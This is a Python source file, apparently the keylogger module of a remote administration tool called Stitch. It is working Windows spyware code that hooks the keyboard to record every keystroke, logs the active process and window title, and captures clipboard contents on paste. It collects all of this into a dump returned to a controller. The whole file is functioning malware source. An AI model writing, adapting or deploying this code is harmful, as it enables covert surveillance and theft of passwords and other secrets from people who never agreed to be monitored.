# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import time
import ctypes
import pyHook
import datetime
import pythoncom
import threading
import subprocess
from ctypes import *
import win32clipboard

kl_active = False

class keylogger(threading.Thread):

    def win_get_clipboard(self):
        win32clipboard.OpenClipboard()
        pasted_value = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return pasted_value

    def get_current_process(self):
        hwnd = self.user32.GetForegroundWindow()
        pid = c_ulong(0)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = "%d" % pid.value
        executable = create_string_buffer("\x00" * 512)
        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        self.psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        window_title = create_string_buffer("\x00" * 512)
        length = self.user32.GetWindowTextA(hwnd, byref(window_title),512)
        now = datetime.datetime.now()
        proc_time=now.strftime("%Y-%m-%d %H:%M:%S")
        proc_info = "[ %s ][ PID: %s - %s - %s ]" % (proc_time, process_id, executable.value, window_title.value)
        self.kl_summary += "\n\n"
        self.kl_summary += proc_info
        self.kl_summary += "\n"

        # close handles
        self.kernel32.CloseHandle(hwnd)
        self.kernel32.CloseHandle(h_process)

    def KeyStroke(self,event):
        if event.WindowName != self.current_window:
            self.current_window = event.WindowName
            self.get_current_process()
            self.keystroke_count = 0
        if self.keystroke_count > 75:
            self.kl_summary += "\n"
            self.keystroke_count = 0
        if event.Ascii > 32 and event.Ascii < 127:
            self.kl_summary += ( chr(event.Ascii))
            self.keystroke_count += 1
        else:
            if event.Key == "V":
                try:
                    pasted_value = self.win_get_clipboard()
                    self.kl_summary += "[PASTE] - {}".format(pasted_value)
                    self.keystroke_count += 10+len(pasted_value)
                    self.last_pasted_value = pasted_value
                except Exception as e:
                    if 'access is denied' in str(e).lower():
                        self.kl_summary += "[PASTE] - {}".format(self.last_pasted_value)
                        self.keystroke_count += 10+len(last_pasted_value)
            else:
                self.kl_summary += "[{}]".format(event.Key)
                self.keystroke_count += 2+len(event.Key)
        return True

    def run(self):
        self.kl_summary = ''
        self.kl_active = True
        self.keystroke_count = 0
        self.current_window = None
        self.kl = pyHook.HookManager()
        self.psapi = ctypes.windll.psapi
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        self.pasted_value = self.win_get_clipboard()

        while self.kl_active:
            self.kl.KeyDown = self.KeyStroke
            self.kl.HookKeyboard()
            while self.kl_active:
                pythoncom.PumpWaitingMessages()
            self.kl.__del__()

    def stop(self):
        self.kl_active = False

def set_kl_active(status):
    global kl_active
    kl_active = status

def st_kl_active():
    global kl_active
    return kl_active

def st_kl_dump(s):
    return s.kl_summary

def st_kl_stop(s):
    s.stop()
    set_kl_active(False)

def st_kl_start(s):
    s.start()
    set_kl_active(True)

def start_st_kl():
    try:
        st_kl = keylogger()
        st_kl.start()
        return True
    except Exception as e:
        return "ERROR: {}".format(e)
